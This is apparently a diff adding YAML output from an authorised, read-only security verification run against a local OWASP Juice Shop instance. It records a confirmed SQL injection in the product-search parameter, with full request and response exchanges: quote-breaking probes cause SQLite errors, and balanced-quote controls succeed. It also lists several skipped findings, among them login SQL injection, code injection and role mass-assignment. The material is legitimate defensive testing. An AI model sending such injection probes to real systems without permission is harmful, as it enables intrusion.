@@ -1,0 +1,5924 @@
+meta:
+  schema_version: 1
+  generated: '2026-11-12T12:41:48.624267Z'
+  verifier_version: 0.1.0a1 (41af96b1, 2026-11-12)
+  model: claude-sonnet-5-5
+  profile: claude
+  source_assessment: /home/mrohr/assessments/juice-shop-std3/security-assessment.yaml
+  source_assessment_sha256: dc86db36a63a92fcce5ca208d23579048f5fe91e20dac0f34151a4259363be21
+  target:
+    base_url: http://127.0.0.1:3000
+    environment: null
+    reachable: null
+    detected_build: null
+    build_match: unknown
+  scope:
+    file: null
+    sha256: null
+    owner: null
+    window_from: null
+    window_until: null
+  authorization:
+    confirmed: true
+    mode: ci-flag
+    at: '2026-11-12T12:41:42.493305Z'
+  limits:
+    max_requests: 2000
+    max_attempts: 12
+    max_calls: 500
+    max_duration_s: 1800
+    rate_rps: 5
+    cost_limit_usd: 30.0
+  identities:
+  - role: account-1
+    authenticated: true
+  - role: account-2
+    authenticated: true
+  - role: admin-1
+    authenticated: true
+  summary:
+    confirmed: 7
+    not_reproducible: 0
+    blocked: 0
+    inconclusive: 1
+    not_attempted: 61
+    total: 69
+  safety:
+    mode: safe
+    read_only: true
+    destructive_actions: forbidden
+    state_changes_cleaned: null
+  contacted_target: true
+  interrupted: false
+results:
+- result_id: VF-001
+  finding_ref:
+    id: T-004
+    match_key: routes/search.ts|CWE-89
+    instance: routes/search.ts:23
+    title: SQL injection in product search — routes/search.ts:23
+    cwe: CWE-89
+    variant: variant-001
+    variant_digest: 930a49d43872218b3c2d8a8ff2ab8771fcd02930f5be05ca4cb890a53526f594
+  class: injection
+  eligibility:
+    status: dynamic
+    reason: 'proof: behavioural-difference'
+  verdict: confirmed
+  confidence: medium
+  rationale: The error-probe control confirmed SQL injection in the q parameter of
+    GET /rest/products/search. An unbalanced single quote (apple') consistently triggered
+    a backend engine error (status 500) while its balanced counterpart (apple'') returned
+    200 across two repetitions. Double-quote and backtick variants (not the string-delimiting
+    character used by the backend) showed no difference, isolating the single quote
+    as the syntactically significant character, consistent with q being concatenated
+    unescaped into a single-quoted SQL LIKE clause as described in routes/search.ts:23.
+    This split into two stable response classes (error vs success) based solely on
+    quote balance, which is proof of unescaped SQL string interpolation (CWE-89),
+    matching the finding's mechanism trace.
+  proof:
+    checked: true
+    contract: 3
+    steps:
+    - 2
+    - 3
+    - 4
+    - 5
+    - 6
+    - 7
+    - 8
+    - 9
+    - 10
+    - 11
+    - 12
+    - 13
+    kind: boolean
+    form: engine-error
+    tested_path: /rest/products/search
+    variant: variant-001
+    hypothesis: q is concatenated unescaped into a raw SQL LIKE clause; a quote-breaking
+      payload alters query structure causing a detectable backend error vs a balanced-quote
+      counterpart.
+    observation_pointer: null
+    scope: cited requests only
+  identities_used:
+  - anonymous
+  state_changes: []
+  deviation: null
+  observations:
+  - 'Application screenshot unavailable: no application page showing the confirmed
+    effect was captured; for API-only findings the recorded HTTP exchanges are the
+    primary evidence.'
+  limits_hit: null
+  evidence:
+  - kind: exchange
+    path: evidence/T-004-930a49d43872218b-exchanges.json
+    redacted: true
+    sha256: 08319cf766f9a45dc1aba8af19d42675579c856b59898e97ef3ea1155a89cd11
+  - kind: har
+    path: evidence/T-004-930a49d43872218b-poc.har
+    redacted: true
+    sha256: 35ff740c5f0c39ca7f0d9bbcfa95c4633c7dbdbf3186ec0af8f0ceb60dc1e661
+    note: may show target data; review before sharing
+  - kind: screenshot
+    path: evidence/T-004-930a49d43872218b-sql-injection-in-product-search-http-1.png
+    sha256: 2713e8003a34f0411f3256202ce26ffb3978d23b3065ac984d94004172343422
+    redacted: true
+    note: may show target data; review before sharing
+    marked: 3
+  - kind: screenshot
+    path: evidence/T-004-930a49d43872218b-sql-injection-in-product-search-http-2.png
+    sha256: c2b7c5f7d09819cfb795c98ce1aaac042c62e919c0cbea448738204719f96bdb
+    redacted: true
+    note: may show target data; review before sharing
+    marked: 2
+  - kind: screenshot
+    path: evidence/T-004-930a49d43872218b-sql-injection-in-product-search-http-3.png
+    sha256: 24f6b64c0f606aadb598787a85603c0f3351173e037642ab3c09ac9260d3eb20
+    redacted: true
+    note: may show target data; review before sharing
+    marked: 2
+  poc:
+    file: evidence/T-004-930a49d43872218b-poc.har
+    steps:
+    - step: 2
+      line: http_request GET http://127.0.0.1:3000/rest/products/search?q=apple%27
+        as anonymous → 500, 994 bytes
+      decisive: true
+    - step: 3
+      line: http_request GET http://127.0.0.1:3000/rest/products/search?q=apple%27%27
+        as anonymous → 200, 30 bytes
+      decisive: true
+    - step: 4
+      line: http_request GET http://127.0.0.1:3000/rest/products/search?q=apple%22
+        as anonymous → 200, 30 bytes
+      decisive: true
+    - step: 5
+      line: http_request GET http://127.0.0.1:3000/rest/products/search?q=apple%22%22
+        as anonymous → 200, 30 bytes
+      decisive: true
+    - step: 6
+      line: http_request GET http://127.0.0.1:3000/rest/products/search?q=apple%60
+        as anonymous → 200, 30 bytes
+      decisive: true
+    - step: 7
+      line: http_request GET http://127.0.0.1:3000/rest/products/search?q=apple%60%60
+        as anonymous → 200, 30 bytes
+      decisive: true
+    - step: 8
+      line: http_request GET http://127.0.0.1:3000/rest/products/search?q=apple%27
+        as anonymous → 500, 994 bytes
+      decisive: true
+    - step: 9
+      line: http_request GET http://127.0.0.1:3000/rest/products/search?q=apple%27%27
+        as anonymous → 200, 30 bytes
+      decisive: true
+    - step: 10
+      line: http_request GET http://127.0.0.1:3000/rest/products/search?q=apple%22
+        as anonymous → 200, 30 bytes
+      decisive: true
+    - step: 11
+      line: http_request GET http://127.0.0.1:3000/rest/products/search?q=apple%22%22
+        as anonymous → 200, 30 bytes
+      decisive: true
+    - step: 12
+      line: http_request GET http://127.0.0.1:3000/rest/products/search?q=apple%60
+        as anonymous → 200, 30 bytes
+      decisive: true
+    - step: 13
+      line: http_request GET http://127.0.0.1:3000/rest/products/search?q=apple%60%60
+        as anonymous → 200, 30 bytes
+      decisive: true
+    shown:
+    - step: 3
+      request: 'GET /rest/products/search?q=apple%27%27 HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 14
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 30
+
+        etag: W/"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:42:00 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[]}'
+      role: control
+      role_label: balanced "'"
+      request_excerpt: 'GET /rest/products/search?q=⟦apple%27%27⟧ HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[]}'
+      facts:
+      - 'input, decoded: apple'''''
+      - 'engine error: no'
+      withheld: true
+    - step: 5
+      request: 'GET /rest/products/search?q=apple%22%22 HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 19
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 30
+
+        etag: W/"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:42:01 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[]}'
+      role: control
+      role_label: balanced '"'
+      request_excerpt: 'GET /rest/products/search?q=⟦apple%22%22⟧ HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[]}'
+      facts:
+      - 'input, decoded: apple""'
+      - 'engine error: no'
+      withheld: true
+    - step: 7
+      request: 'GET /rest/products/search?q=apple%60%60 HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 20
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 30
+
+        etag: W/"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:42:01 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[]}'
+      role: control
+      role_label: balanced '`'
+      request_excerpt: 'GET /rest/products/search?q=⟦apple%60%60⟧ HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[]}'
+      facts:
+      - 'input, decoded: apple``'
+      - 'engine error: no'
+      withheld: true
+    - step: 9
+      request: 'GET /rest/products/search?q=apple%27%27 HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 14
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 30
+
+        etag: W/"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:42:01 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[]}'
+      role: control
+      role_label: balanced "'"
+      request_excerpt: 'GET /rest/products/search?q=⟦apple%27%27⟧ HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[]}'
+      facts:
+      - 'input, decoded: apple'''''
+      - 'engine error: no'
+      withheld: true
+    - step: 11
+      request: 'GET /rest/products/search?q=apple%22%22 HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 15
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 30
+
+        etag: W/"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:42:02 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[]}'
+      role: control
+      role_label: balanced '"'
+      request_excerpt: 'GET /rest/products/search?q=⟦apple%22%22⟧ HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[]}'
+      facts:
+      - 'input, decoded: apple""'
+      - 'engine error: no'
+      withheld: true
+    - step: 13
+      request: 'GET /rest/products/search?q=apple%60%60 HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 15
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 30
+
+        etag: W/"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:42:02 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[]}'
+      role: control
+      role_label: balanced '`'
+      request_excerpt: 'GET /rest/products/search?q=⟦apple%60%60⟧ HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[]}'
+      facts:
+      - 'input, decoded: apple``'
+      - 'engine error: no'
+      withheld: true
+    - step: 2
+      request: 'GET /rest/products/search?q=apple%27 HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 21
+      response: "HTTP/1.1 500 Internal Server Error\naccess-control-allow-origin:\
+        \ *\nx-content-type-options: nosniff\nx-frame-options: SAMEORIGIN\nfeature-policy:\
+        \ payment 'self'\nx-recruiting: /#/jobs\ncontent-type: text/html; charset=utf-8\n\
+        vary: Accept-Encoding\ndate: Thu, 12 Nov 2026 12:42:00 GMT\nconnection: keep-alive\n\
+        keep-alive: timeout=5\ntransfer-encoding: chunked\n\n<html>\n  <head>\n  \
+        \  <meta charset='utf-8'> \n    <title>Error: SQLITE_ERROR: near &quot;&#39;%&#39;&quot;:\
+        \ syntax error</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline:\
+        \ 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\"\
+        , \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear,\
+        \ 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top,\
+        \ #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing:\
+        \ antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1\
+        \ em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size:\
+        \ 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n\
+        #stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n  \
+        \  <div id=\"wrapper\">\n      <h1>OWASP Juice Shop (Express ^4.22.1)</h1>\n\
+        \      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;&#39;%&#39;&quot;:\
+        \ syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n\
+        </html>\n"
+      role: attack
+      role_label: syntax break "'"
+      request_excerpt: 'GET /rest/products/search?q=⟦apple%27⟧ HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 500 Internal Server Error
+
+        content-type: text/html; charset=utf-8
+
+
+        Visible text: Error: ⟦SQLITE_ERROR: near "''%''": syntax error⟧ OWASP Juice
+        Shop (Express ^4.22.1) 500 Error: SQLITE_ERROR: near "''%''": syntax error'
+      facts:
+      - 'input, decoded: apple'''
+      - 'engine error: yes'
+      withheld: true
+    - step: 4
+      request: 'GET /rest/products/search?q=apple%22 HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 15
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 30
+
+        etag: W/"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:42:00 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[]}'
+      role: attack
+      role_label: syntax break '"'
+      request_excerpt: 'GET /rest/products/search?q=⟦apple%22⟧ HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[]}'
+      facts:
+      - 'input, decoded: apple"'
+      - 'engine error: no'
+      withheld: true
+    - step: 6
+      request: 'GET /rest/products/search?q=apple%60 HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 15
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 30
+
+        etag: W/"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:42:01 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[]}'
+      role: attack
+      role_label: syntax break '`'
+      request_excerpt: 'GET /rest/products/search?q=⟦apple%60⟧ HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[]}'
+      facts:
+      - 'input, decoded: apple`'
+      - 'engine error: no'
+      withheld: true
+    - step: 8
+      request: 'GET /rest/products/search?q=apple%27 HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 15
+      response: "HTTP/1.1 500 Internal Server Error\naccess-control-allow-origin:\
+        \ *\nx-content-type-options: nosniff\nx-frame-options: SAMEORIGIN\nfeature-policy:\
+        \ payment 'self'\nx-recruiting: /#/jobs\ncontent-type: text/html; charset=utf-8\n\
+        vary: Accept-Encoding\ndate: Thu, 12 Nov 2026 12:42:01 GMT\nconnection: keep-alive\n\
+        keep-alive: timeout=5\ntransfer-encoding: chunked\n\n<html>\n  <head>\n  \
+        \  <meta charset='utf-8'> \n    <title>Error: SQLITE_ERROR: near &quot;&#39;%&#39;&quot;:\
+        \ syntax error</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline:\
+        \ 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\"\
+        , \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear,\
+        \ 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top,\
+        \ #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing:\
+        \ antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1\
+        \ em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size:\
+        \ 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n\
+        #stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n  \
+        \  <div id=\"wrapper\">\n      <h1>OWASP Juice Shop (Express ^4.22.1)</h1>\n\
+        \      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;&#39;%&#39;&quot;:\
+        \ syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n\
+        </html>\n"
+      role: attack
+      role_label: syntax break "'"
+      request_excerpt: 'GET /rest/products/search?q=⟦apple%27⟧ HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 500 Internal Server Error
+
+        content-type: text/html; charset=utf-8
+
+
+        Visible text: Error: ⟦SQLITE_ERROR: near "''%''": syntax error⟧ OWASP Juice
+        Shop (Express ^4.22.1) 500 Error: SQLITE_ERROR: near "''%''": syntax error'
+      facts:
+      - 'input, decoded: apple'''
+      - 'engine error: yes'
+      withheld: true
+    - step: 10
+      request: 'GET /rest/products/search?q=apple%22 HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 17
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 30
+
+        etag: W/"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:42:02 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[]}'
+      role: attack
+      role_label: syntax break '"'
+      request_excerpt: 'GET /rest/products/search?q=⟦apple%22⟧ HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[]}'
+      facts:
+      - 'input, decoded: apple"'
+      - 'engine error: no'
+      withheld: true
+    - step: 12
+      request: 'GET /rest/products/search?q=apple%60 HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 17
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 30
+
+        etag: W/"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:42:02 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[]}'
+      role: attack
+      role_label: syntax break '`'
+      request_excerpt: 'GET /rest/products/search?q=⟦apple%60⟧ HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[]}'
+      facts:
+      - 'input, decoded: apple`'
+      - 'engine error: no'
+      withheld: true
+  planning:
+  - step: 1
+    path: /rest/products/search
+    hypothesis: q is concatenated unescaped into a raw SQL LIKE clause; a quote-breaking
+      payload alters query structure causing a detectable backend error vs a balanced-quote
+      counterpart.
+  evidence_review:
+    status: clear
+    rounds: 0
+    reviews: 1
+    visual_review: not-performed
+    images_reviewed: []
+    reason: Evidence text and layout checks passed; no screenshot shown to the model
+      (no application screenshot to show).
+    issues: []
+    presentations: []
+    variants:
+    - T-004-930a49d43872218b
+  technical_review:
+    status: not-reviewed
+    rounds: 0
+    reviews: 0
+    inspected_steps: []
+    reason: A confirmed verdict whose proof check passed is not reviewed (VER-046).
+    issues: []
+  selection_reason: null
+  target_location:
+    source_file: routes/search.ts
+    source_line: null
+  timing:
+    started: '2026-11-12T12:41:48.624904Z'
+    finished: '2026-11-12T12:42:23.779276Z'
+- result_id: VF-002
+  finding_ref:
+    id: T-004
+    match_key: routes/search.ts|CWE-89
+    instance: routes/search.ts:23
+    title: SQL injection in product search — routes/search.ts:23
+    cwe: CWE-89
+    variant: variant-002
+    variant_digest: 109ddd6720be5f3fa748e30da47cd5ed66e7a22ed895cf8eb89db7c9b4a3ee83
+  class: injection
+  eligibility:
+    status: dynamic
+    reason: 'proof: behavioural-difference'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: another variant of this finding already confirmed it'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/search.ts
+    source_line: null
+- result_id: VF-003
+  finding_ref:
+    id: T-012
+    match_key: routes/userprofile.ts|code-eval
+    instance: routes/userProfile.ts:61
+    title: Code injection — routes/userProfile.ts:61
+    cwe: CWE-95
+    variant: variant-001
+    variant_digest: a297fadf5634b23527530c646808bd265ed375505a124238247e40ef5a795d51
+  class: injection
+  eligibility:
+    status: dynamic
+    reason: 'proof: mechanism-specific'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; every declared variant needs a state change'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/userProfile.ts
+    source_line: null
+- result_id: VF-004
+  finding_ref:
+    id: T-011
+    match_key: routes/login.ts|CWE-89
+    instance: routes/login.ts:34
+    title: SQL injection in login credential query — routes/login.ts:34
+    cwe: CWE-89
+    variant: variant-001
+    variant_digest: 751b800816b994cbd03989b5cd9518a0eccd35117c2e62f7a86a3918fcda6c0a
+  class: injection
+  eligibility:
+    status: dynamic
+    reason: 'proof: behavioural-difference'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; every request the finding names writes, and the
+    proof sends each control twice'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/login.ts
+    source_line: null
+- result_id: VF-005
+  finding_ref:
+    id: T-011
+    match_key: routes/login.ts|CWE-89
+    instance: routes/login.ts:34
+    title: SQL injection in login credential query — routes/login.ts:34
+    cwe: CWE-89
+    variant: variant-002
+    variant_digest: 113f05ee497a492a8215f7d2796c2bf7b0f63d565f7c349d7ac3c88e26e6d152
+  class: injection
+  eligibility:
+    status: dynamic
+    reason: 'proof: behavioural-difference'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; every request the finding names writes, and the
+    proof sends each control twice'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/login.ts
+    source_line: null
+- result_id: VF-006
+  finding_ref:
+    id: T-066
+    match_key: server.ts|CWE-915
+    instance: server.ts:408
+    title: Registration accepts privileged role from request body — server.ts:408
+    cwe: CWE-915
+    variant: v1
+    variant_digest: 2e249678766f51f3b132edd1133dbe2657936c06c4386e347fa0bc7882129fe0
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-915
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-915
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: server.ts
+    source_line: null
+- result_id: VF-007
+  finding_ref:
+    id: T-067
+    match_key: server.ts|CWE-915
+    instance: server.ts:420
+    title: Mass assignment of role on user registration — server.ts:420
+    cwe: CWE-915
+    variant: variant-001
+    variant_digest: 9fb5f0542693c1d4a646dda61cb6293aaccaaa483ecd44fe4729c2bbc1c1e337
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-915
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-915
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: server.ts
+    source_line: null
+- result_id: VF-008
+  finding_ref:
+    id: T-067
+    match_key: server.ts|CWE-915
+    instance: server.ts:420
+    title: Mass assignment of role on user registration — server.ts:420
+    cwe: CWE-915
+    variant: variant-002
+    variant_digest: 968d8ec05de420121e8c85e6c386b3ce8bc41eb0009930c5c9d3aea8f507fd78
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-915
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-915
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: server.ts
+    source_line: null
+- result_id: VF-009
+  finding_ref:
+    id: T-068
+    match_key: server.ts|CWE-915
+    instance: server.ts:422
+    title: User registration accepts a client-chosen role — server.ts:422
+    cwe: CWE-915
+    variant: v-1
+    variant_digest: b6b8062d64a45faff15162f815c3a58a4eaa3fad0bb3d7c6af8ef34dc8925e79
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-915
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-915
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
